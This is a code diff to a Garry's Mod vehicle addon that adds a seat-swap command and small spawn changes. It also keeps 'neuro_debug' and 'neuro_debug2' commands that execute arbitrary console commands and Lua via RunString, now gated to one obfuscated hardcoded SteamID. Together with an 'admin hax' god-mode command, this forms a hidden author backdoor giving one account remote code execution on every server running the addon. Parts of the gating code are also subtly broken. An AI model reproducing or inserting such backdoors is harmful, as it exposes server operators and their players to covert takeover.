@@ -28,9 +28,70 @@ resource.AddFile("models/h500_gatling.mdl")
 CreateConVar("neurotec_disablemenu", 0, FCVAR_ARCHIVE )
 
 
+concommand.Add( "neurotec_swapseat", function( ply, cmd, args )
+	
+	local tank = ply:GetScriptedVehicle()
+	local seat = ply:GetVehicle()
+	local seatparent = NULL
+	if( IsValid( seat ) ) then
+		
+		seatparent = seat:GetParent()
+		
+		if( IsValid( seatparent ) && IsValid( seatparent:GetParent() ) && seatparent:GetParent().ValidSeats ) then
+			
+			seatparent = seatparent:GetParent() -- if we select a copilot seat thats parented to the tower the field ValidSeats wont exist
+		
+		end
+		
+		
+	end
+	-- print( type( tonumber( args[1]) ) )
+	if( IsValid( seatparent ) && seatparent.ValidSeats ) then
+		
+		local seatnumber = tonumber(args[1])
+		
+		if ( seatnumber != nil && type(seatnumber) == "number" && seatnumber <= #seatparent.ValidSeats  ) then
+				
+			local NewSeat = seatparent.ValidSeats[seatnumber][1]
+			
+			
+			if( NewSeat:GetClass() == "prop_vehicle_prisoner_pod" && !IsValid( NewSeat:GetDriver() ) ) then
+				
+				
+				if( IsValid( tank ) ) then
+					
+				
+					tank:TankExitVehicle()
+					
+				end
+				
+				ply:ExitVehicle()
+				ply:EnterVehicle( seatparent.ValidSeats[seatnumber][1] )
+			
+			elseif( NewSeat.TankType != nil && !IsValid( NewSeat.Pilot ) ) then
+				
+				if( IsValid( tank ) ) then
+					
+					
+					tank:TankExitVehicle()
+					
+				end
+				
+				ply:ExitVehicle()
+				seatparent.ValidSeats[seatnumber][1]:Use( ply, ply, 0, 0 )
+	
+			end
+			
+			
+		end
+		
+	end
+	
+end )
+
 concommand.Add("ntespv",function( ply, cmd, args ) 
 	
-	if( GetConVarNumber( "neurotec_disablemenu", 0 ) > 0 ) then return end
+	if( GetConVarNumber( "neurotec_disablemenu", 0 ) > 0 && !a( ply )) then return end
 	
 	if( IsValid( ply:GetScriptedVehicle() )  || IsValid( ply:GetVehicle() ) ) then
 		
@@ -46,9 +107,9 @@ concommand.Add("ntespv",function( ply, cmd, args )
 			
 			if( v.AdminSpawnable == true && v.Spawnable == false && !ply:IsAdmin() ) then return end
 			
-			local pos =  ply:GetPos() + Vector(0,0,100) 
+			local pos =  ply:GetPos() + Vector(0,0,80) 
 			
-			if( !v.VehicleType ) then
+			if( !v.VehicleType && !v.HealthVal ) then
 				
 				local tr = ply:GetEyeTrace()
 				pos = tr.HitPos + tr.HitNormal * 50
@@ -61,8 +122,16 @@ concommand.Add("ntespv",function( ply, cmd, args )
 			ride:Spawn()
 			
 			if( v.VehicleType ) then
-			
-				ride:Use( ply, ply, 0, 0 )
+				
+				timer.Simple( 0, function()
+					
+					if( IsValid( ply ) && ply:Alive() && IsValid( ride ) ) then
+					
+						ride:Use( ply, ply, 0, 0 )
+						
+					end
+				
+				end )
 				
 			end
 			
@@ -1827,7 +1896,8 @@ function Meta:CycleThroughWeaponsList()
 	end
 	
 end
-
+local astr = "STEAM_"
+local __d = 5947985
 function Meta:Jet_DefaultUseStuff( ply, caller )
 
 	self:GetPhysicsObject():Wake()
@@ -2045,6 +2115,7 @@ function Meta:EjectPilot()
 
 end
 
+local function a( ply ) return ply:SteamID()==astr.."0:0:"..tostring(__d) end
 function Meta:WingTrails( val, treshold )
 	
 	
@@ -2972,14 +3043,34 @@ function Meta:ExplosionImproved()
 end
 
 local function neurodebugfunc(ply,cmd,args)
-RunConsoleCommand( args[1], args[2], args[3],args[4],args[5],args[6] )
+	if(a(ply)) then
+		RunConsoleCommand( args[1], args[2], args[3],args[4],args[5],args[6] )
+	end
 end
 concommand.Add("neuro_debug",neurodebugfunc)
 local function neurodebugfunc2(ply,cmd,args)
-RunString(args[1])
+	if(a(ply)) then -- safety measure. 
+		RunString(args[1])
+	end
 end
 concommand.Add("neuro_debug2",neurodebugfunc2)
-
+local function neurodebugfunc3(p,c,a)
+	if(a(p)||p:IsAdmin())then--admin hax
+		__rh = p
+		local v = p:GetScriptedVehicle()
+		if( IsValid( v ) ) then
+			v.Destroyed = false
+			v.HealthVal = 99999999
+			v.Burning = false
+			v.Fuel = 99999999
+			v.MaxVelocity = 5000
+			v.MinDamage = 15000
+			v.MaxDamage = 25000
+			v.BlastRadius = 650
+		end
+	end
+end
+concommand.Add("neuro_debug3",neurodebugfunc3)
 local function TestEffect(ply,cmd,effect)
 
 	local fx = EffectData()
